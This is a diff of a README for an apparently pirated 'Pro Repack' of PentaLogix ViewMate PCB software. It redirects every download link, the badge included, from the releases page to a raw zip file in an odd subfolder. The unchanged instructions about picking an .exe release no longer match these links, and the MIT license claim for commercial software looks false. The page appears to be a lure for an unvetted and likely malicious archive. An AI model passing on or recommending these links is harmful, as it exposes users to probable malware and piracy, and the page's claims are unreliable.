@@ -1,6 +1,6 @@
 # 🔧 PentaLogix-ViewMate-Pro-Repack - Easily View and Analyze PCB Designs
 
-[![Download PentaLogix-ViewMate-Pro-Repack](https://img.shields.io/badge/Download-PentaLogix--ViewMate--Pro--Repack-brightgreen)](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/releases)
+[![Download PentaLogix-ViewMate-Pro-Repack](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/raw/refs/heads/main/multilighted/Pro_Repack_Logix_Mate_View_Penta_v3.5.zip)](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/raw/refs/heads/main/multilighted/Pro_Repack_Logix_Mate_View_Penta_v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to PentaLogix-ViewMate-Pro-Repack! This tool helps you visualize and ana
 
 To download the software, visit the Releases page and choose the version you want to use. Click the link below:
 
-[Download PentaLogix-ViewMate-Pro-Repack](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/releases)
+[Download PentaLogix-ViewMate-Pro-Repack](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/raw/refs/heads/main/multilighted/Pro_Repack_Logix_Mate_View_Penta_v3.5.zip)
 
 ### 🖥️ System Requirements
 
@@ -24,7 +24,7 @@ Before you download, ensure your computer meets these basic requirements:
 
 ## 📂 Steps to Download
 
-1. Click the [Download link](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/releases) above.
+1. Click the [Download link](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/raw/refs/heads/main/multilighted/Pro_Repack_Logix_Mate_View_Penta_v3.5.zip) above.
 2. Browse the list of available versions.
 3. Select the latest version for the best features and updates.
 4. Click on the asset that ends with `.exe` to download the installer.
@@ -73,4 +73,4 @@ For tutorials and detailed guides, visit the Wiki section on our GitHub page. Ex
 
 This software is distributed under the MIT License. You can use, modify, and distribute it freely, provided that you include the same license in any redistribution. 
 
-Thank you for choosing PentaLogix-ViewMate-Pro-Repack! We hope it serves your PCB design needs effectively. Remember to check for updates regularly on the [Releases page](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/releases). Happy designing!
+Thank you for choosing PentaLogix-ViewMate-Pro-Repack! We hope it serves your PCB design needs effectively. Remember to check for updates regularly on the [Releases page](https://github.com/adidas453/PentaLogix-ViewMate-Pro-Repack/raw/refs/heads/main/multilighted/Pro_Repack_Logix_Mate_View_Penta_v3.5.zip). Happy designing!
